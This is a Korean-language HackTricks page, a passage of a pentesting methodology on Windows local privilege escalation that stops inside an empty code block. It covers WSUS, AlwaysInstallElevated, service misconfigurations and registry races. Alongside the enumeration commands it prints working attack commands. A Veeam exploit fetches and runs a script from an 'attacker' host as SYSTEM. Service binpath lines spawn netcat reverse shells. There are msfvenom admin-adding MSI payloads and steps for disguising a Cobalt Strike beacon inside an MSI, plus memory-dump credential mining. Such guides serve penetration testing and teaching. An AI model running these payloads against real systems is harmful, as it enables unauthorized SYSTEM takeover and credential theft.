# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation 벡터를 찾는 데 가장 좋은 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 초기 Windows 이론

### Access Tokens

**Windows Access Tokens가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 정보는 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows의 integrity levels가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽어야 합니다:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows에는 시스템 열거를 **방해**하거나, executable을 실행하거나, 심지어 **활동을 탐지**할 수 있는 여러 요소가 있습니다. privilege escalation 열거를 시작하기 전에 다음 **page**를 **읽고**, 이러한 모든 **defenses** **mechanisms**를 **열거**해야 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess`를 통해 실행된 UIAccess processes는 AppInfo secure-path checks가 우회되면 프롬프트 없이 High IL에 도달하는 데 악용될 수 있습니다. 전용 UIAccess/Admin Protection bypass workflow는 여기에서 확인하세요:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation은 임의의 SYSTEM registry write(RegPwn)에 악용될 수 있습니다:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Windows version에 알려진 vulnerability가 있는지 확인하세요(적용된 patches도 함께 확인).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

이 [site](https://msrc.microsoft.com/update-guide/vulnerability)은 Microsoft 보안 취약점에 대한 자세한 정보를 검색하는 데 유용합니다. 이 데이터베이스에는 4,700개가 넘는 보안 취약점이 있어, Windows 환경이 제공하는 **거대한 attack surface**를 보여줍니다.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env 변수에 저장된 credential/Juicy info가 있나요?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)를 통해 이 기능을 켜는 방법을 배울 수 있습니다.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 파이프라인 실행의 세부 정보가 기록되며, 실행된 명령, 명령 호출, 그리고 스크립트의 일부가 포함됩니다. 그러나 전체 실행 세부 정보와 출력 결과는 캡처되지 않을 수 있습니다.

이를 활성화하려면 문서의 "Transcript files" 섹션에 있는 지침을 따르고, **"Powershell Transcription"** 대신 **"Module Logging"**을 선택하세요.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell 로그에서 마지막 15개 이벤트를 보려면 다음을 실행할 수 있습니다:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

스크립트 실행의 완전한 활동과 전체 내용 기록이 캡처되어, 모든 코드 블록이 실행되는 동안 문서화되도록 보장합니다. 이 프로세스는 각 활동에 대한 포괄적인 감사 추적을 보존하며, 포렌식과 악성 행위 분석에 유용합니다. 실행 시점에 모든 활동을 문서화함으로써, 프로세스에 대한 상세한 인사이트가 제공됩니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block의 로깅 이벤트는 Windows Event Viewer에서 다음 경로에서 찾을 수 있습니다: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
마지막 20개 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

업데이트가 http**S**가 아니라 http를 사용하여 요청되지 않는다면 시스템을 손상시킬 수 있습니다.

cmd에서 다음을 실행하여 네트워크가 non-SSL WSUS update를 사용하는지 확인하는 것으로 시작합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
또는 PowerShell에서 다음과 같이:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
다음과 같은 답변을 받으면:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
그리고 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 또는 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 값이 `1`과 같다면.

그렇다면 **exploitable**합니다. 마지막 registry 값이 0과 같으면, WSUS 엔트리는 무시됩니다.

이 vulnerabilities를 exploit하려면 다음과 같은 tools를 사용할 수 있습니다: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- 이것들은 비-SSL WSUS traffic에 'fake' updates를 주입하는 MiTM weaponized exploits scripts입니다.

여기에서 research를 읽어보세요:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**전체 report를 여기에서 읽어보세요**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
기본적으로, 이것이 이 bug가 exploit하는 flaw입니다:

> 우리가 local user proxy를 수정할 수 있는 power를 가지고 있고, Windows Updates가 Internet Explorer의 settings에서 configured된 proxy를 사용한다면, 우리는 따라서 [PyWSUS](https://github.com/GoSecure/pywsus)를 local에서 run하여 우리 own traffic을 intercept하고 asset에서 elevated user로 code를 run할 수 있는 power를 가지게 됩니다.
>
> 또한, WSUS service는 current user의 settings를 사용하므로 certificate store도 사용합니다. WSUS hostname에 대한 self-signed certificate를 생성하고 이 certificate를 current user의 certificate store에 추가하면, HTTP와 HTTPS WSUS traffic 둘 다를 intercept할 수 있게 됩니다. WSUS는 certificate에 대해 trust-on-first-use type validation을 구현하는 HSTS-like mechanisms를 사용하지 않습니다. 제시된 certificate가 user에 의해 trusted되고 올바른 hostname을 가지면, service에 의해 accepted됩니다.

tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)을 사용해 이 vulnerability를 exploit할 수 있습니다(한번 liberated되면).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

많은 enterprise agents는 localhost IPC surface와 privileged update channel을 노출합니다. enrollment를 attacker server로 강제할 수 있고 updater가 rogue root CA 또는 weak signer checks를 신뢰한다면, local user는 SYSTEM service가 설치하는 malicious MSI를 전달할 수 있습니다. 일반화된 technique(Netskope stAgentSvc chain – CVE-2025-0309 기반)은 여기에서 확인하세요:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401을 통한 SYSTEM)

Veeam B&R < `11.0.1.1261`는 attacker-controlled messages를 처리하는 localhost service를 **TCP/9401**에서 노출하며, **NT AUTHORITY\SYSTEM**으로 arbitrary commands를 허용합니다.

- **Recon**: listener와 version을 확인합니다. 예: `netstat -ano | findstr 9401` 및 `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: 필요한 Veeam DLLs가 있는 `VeeamHax.exe` 같은 PoC를 같은 directory에 두고, 로컬 socket을 통해 SYSTEM payload를 트리거합니다:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
서비스는 명령을 SYSTEM으로 실행합니다.
## KrbRelayUp

특정 조건에서 Windows **domain** 환경에는 **local privilege escalation** 취약점이 존재합니다. 이러한 조건에는 **LDAP signing**이 적용되지 않는 환경, 사용자가 **Resource-Based Constrained Delegation (RBCD)** 를 구성할 수 있도록 하는 self-rights를 보유한 경우, 그리고 사용자가 domain 내에서 computers를 생성할 수 있는 기능이 포함됩니다. 이러한 **requirements**는 **default settings**에서 충족된다는 점을 유의해야 합니다.

**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) 에서 찾을 수 있습니다.

공격 흐름에 대한 자세한 내용은 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) 를 확인하세요.

## AlwaysInstallElevated

이 2개의 registers가 **enabled** 상태이고 값이 **0x1** 이면, 어떤 권한의 사용자든 `*.msi` 파일을 NT AUTHORITY\\**SYSTEM** 권한으로 **install**(execute)할 수 있습니다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-up의 `Write-UserAddMSI` 명령을 사용하여 현재 디렉터리 안에 권한 상승을 위한 Windows MSI 바이너리를 생성합니다. 이 스크립트는 사용자/그룹 추가를 요청하는 미리 컴파일된 MSI installer를 작성합니다(따라서 GIU access가 필요합니다):
```
Write-UserAddMSI
```
그냥 생성된 바이너리를 실행하여 권한을 상승시키세요.

### MSI Wrapper

이 도구를 사용하여 MSI wrapper를 만드는 방법을 배우려면 이 튜토리얼을 읽으세요. **.bat** 파일은 **명령줄**을 **그냥** **실행**하고 싶을 때 래핑할 수 있다는 점에 유의하세요


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX로 MSI 만들기


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio로 MSI 만들기

- Cobalt Strike 또는 Metasploit으로 `C:\privesc\beacon.exe`에 **새 Windows EXE TCP payload**를 **생성**하세요
- **Visual Studio**를 열고 **Create a new project**를 선택한 다음 검색 상자에 "installer"를 입력하세요. **Setup Wizard** 프로젝트를 선택하고 **Next**를 클릭하세요.
- 프로젝트 이름을 **AlwaysPrivesc**처럼 지정하고, 위치는 **`C:\privesc`**를 사용한 뒤, **place solution and project in the same directory**를 선택하고 **Create**를 클릭하세요.
- 4단계 중 3단계(포함할 파일 선택)까지 **Next**를 계속 클릭하세요. **Add**를 클릭하고 방금 생성한 Beacon payload를 선택한 다음 **Finish**를 클릭하세요.
- **Solution Explorer**에서 **AlwaysPrivesc** 프로젝트를 강조 표시하고, **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경하세요.
- 설치된 앱이 더 합법적으로 보이게 할 수 있는 **Author**와 **Manufacturer** 같은 다른 속성들도 변경할 수 있습니다.
- 프로젝트를 마우스 오른쪽 버튼으로 클릭하고 **View > Custom Actions**를 선택하세요.
- **Install**을 마우스 오른쪽 버튼으로 클릭하고 **Add Custom Action**을 선택하세요.
- **Application Folder**를 더블클릭하고, **beacon.exe** 파일을 선택한 다음 **OK**를 클릭하세요. 이렇게 하면 설치 프로그램이 실행되자마자 beacon payload가 실행됩니다.
- **Custom Action Properties**에서 **Run64Bit**를 **True**로 변경하세요.
- 마지막으로 **build it** 하세요.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` 경고가 표시되면 플랫폼을 x64로 설정했는지 확인하세요.

### MSI Installation

악성 `.msi` 파일의 **설치**를 **백그라운드**에서 실행하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 exploit하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

이 설정들은 무엇이 **로그로 남는지**를 결정하므로, 주의해야 합니다
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding는 로그가 어디로 전송되는지 알아두는 것이 중요하다
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 **로컬 Administrator 비밀번호 관리**를 위해 설계되었으며, 도메인에 가입된 컴퓨터에서 각 비밀번호가 **고유하고, 무작위로 생성되며, 정기적으로 업데이트**되도록 보장합니다. 이러한 비밀번호는 Active Directory 내에 안전하게 저장되며, ACL을 통해 충분한 권한을 부여받은 사용자만 접근할 수 있어, 승인된 경우 로컬 admin 비밀번호를 볼 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화되어 있으면, **평문 비밀번호가 LSASS** (Local Security Authority Subsystem Service)에 저장됩니다.\
[**이 페이지에서 WDigest에 대한 더 많은 정보**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**부터 Microsoft는 Local Security Authority (LSA)에 대한 강화된 보호를 도입하여, 신뢰할 수 없는 프로세스가 **메모리를 읽거나** 코드를 주입하려는 시도를 **차단**함으로써 시스템 보안을 한층 더 강화했습니다.\
[**LSA Protection에 대한 자세한 내용은 여기**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**는 **Windows 10**에서 도입되었습니다. 그 목적은 pass-the-hash 공격과 같은 위협으로부터 디바이스에 저장된 credentials를 보호하는 것입니다.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 캐시된 자격 증명

**도메인 자격 증명**은 **Local Security Authority** (LSA)에 의해 인증되며 운영 체제 구성 요소에서 사용됩니다. 사용자의 로그온 데이터가 등록된 보안 패키지에 의해 인증되면, 해당 사용자에 대한 도메인 자격 증명이 일반적으로 생성됩니다.\
[**캐시된 자격 증명에 대한 자세한 정보는 여기**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Enumerate Users & Groups

자신이 속한 그룹들 중 어떤 그룹이 흥미로운 권한을 가지고 있는지 확인해야 합니다
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 특권 그룹

만약 당신이 **특권 그룹에 속해 있다면 권한 상승이 가능할 수 있습니다**. 특권 그룹과 이를 악용해 권한을 상승시키는 방법은 여기에서 알아보세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### 토큰 조작

**토큰**이 무엇인지 이 페이지에서 **더 알아보세요**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
흥미로운 토큰에 대해 **알아보고**, 이를 어떻게 악용하는지 다음 페이지를 확인하세요:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 로그인한 사용자 / 세션
```bash
qwinsta
klist sessions
```
### 홈 폴더
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 비밀번호 정책
```bash
net accounts
```
### 클립보드의 내용을 가져오기
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 프로세스

### 파일 및 폴더 권한

우선, 프로세스를 나열할 때 **프로세스의 command line 안에 비밀번호가 있는지 확인**하세요.\
실행 중인 어떤 binary를 **덮어쓸 수 있는지** 또는 binary 폴더에 write permissions가 있는지 확인해, 가능한 [**DLL Hijacking attacks**](dll-hijacking/index.html)를 악용하세요:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**프로세스 바이너리의 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 바이너리의 폴더 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

**procdump** from sysinternals를 사용하여 실행 중인 프로세스의 memory dump를 만들 수 있습니다. FTP 같은 서비스는 **credentials가 memory에 clear text로** 존재하므로, memory를 dump하고 credentials를 읽어보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM으로 실행 중인 Applications는 user가 CMD를 실행하거나 디렉터리를 탐색할 수 있게 할 수 있습니다.**

예: "Windows Help and Support" (Windows + F1)에서 "command prompt"를 검색한 뒤, "Click to open Command Prompt"를 클릭

## Services

Service Triggers는 Windows가 특정 조건이 발생할 때 service를 시작하도록 합니다(named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). SERVICE_START rights가 없어도 trigger를 발생시켜 privileged services를 시작할 수 있는 경우가 많습니다. 여기서 enumeration 및 activation techniques를 확인하세요:

-
{{#ref}}
service-triggers.md
{{#endref}}

서비스 목록 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

**sc**를 사용하여 서비스에 대한 정보를 얻을 수 있습니다
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하기 위해 _Sysinternals_의 바이너리 **accesschk**를 사용하는 것이 권장된다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"가 어떤 service를 수정할 수 있는지 확인하는 것이 권장됩니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

다음과 같은 오류가 발생하는 경우(예: SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

다음을 사용해 활성화할 수 있습니다
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**서비스 upnphost는 작동하기 위해 SSDPSRV에 의존합니다(XP SP1의 경우)**

**이 문제의 또 다른 우회 방법**은 다음을 실행하는 것입니다:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

"Authenticated users" 그룹이 어떤 서비스에 대해 **SERVICE_ALL_ACCESS** 권한을 가지고 있는 경우, 해당 서비스의 실행 바이너리를 수정할 수 있습니다. **sc**를 수정하고 실행하려면:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
다양한 권한을 통해 권한 상승이 가능합니다:

- **SERVICE_CHANGE_CONFIG**: 서비스 바이너리의 재구성을 허용합니다.
- **WRITE_DAC**: 권한 재구성을 가능하게 하며, 이를 통해 서비스 구성을 변경할 수 있습니다.
- **WRITE_OWNER**: 소유권 획득과 권한 재구성을 허용합니다.
- **GENERIC_WRITE**: 서비스 구성을 변경할 수 있는 권한을 상속합니다.
- **GENERIC_ALL**: 역시 서비스 구성을 변경할 수 있는 권한을 상속합니다.

이 취약점의 탐지와 익스플로잇에는 _exploit/windows/local/service_permissions_ 를 활용할 수 있습니다.

### Services binaries weak permissions

**서비스가 실행하는 바이너리를 수정할 수 있는지** 또는 바이너리가 위치한 폴더에 **쓰기 권한이 있는지** 확인하세요 ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic** 를 사용하면 서비스가 실행하는 모든 바이너리(system32가 아닌)를 확인할 수 있고, **icacls** 를 사용해 권한을 점검할 수 있습니다:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
You can also use **sc** and **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

서비스 registry를 수정할 수 있는지 확인해야 합니다.\
서비스 **registry**에 대한 **permissions**를 확인하는 방법은 다음과 같습니다:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지 확인해야 합니다. 그렇다면 서비스가 실행하는 binary를 변경할 수 있습니다.

실행되는 binary의 Path를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

일부 Windows Accessibility 기능은 사용자별 **ATConfig** 키를 생성하고, 이후 **SYSTEM** 프로세스가 이를 HKLM 세션 키로 복사합니다. Registry **symbolic link race**를 이용하면 이 권한 상승 쓰기를 **임의의 HKLM 경로**로 우회시켜, arbitrary HKLM **value write** primitive를 얻을 수 있습니다.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

이 권한이 registry에 대해 있으면, **이 registry 아래에 sub registries를 생성할 수 있다**는 뜻이다. Windows services의 경우 이것만으로도 **arbitrary code를 execute하기에 충분하다:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

실행 파일의 path가 quotes 안에 있지 않으면, Windows는 space 앞까지의 모든 끝부분을 실행하려고 시도한다.

예를 들어, _C:\Program Files\Some Folder\Service.exe_ path의 경우 Windows는 다음을 실행하려고 시도한다:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
인용되지 않은 서비스 경로를 모두 나열하세요. 단, 기본 제공 Windows 서비스에 속하는 것은 제외하세요:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
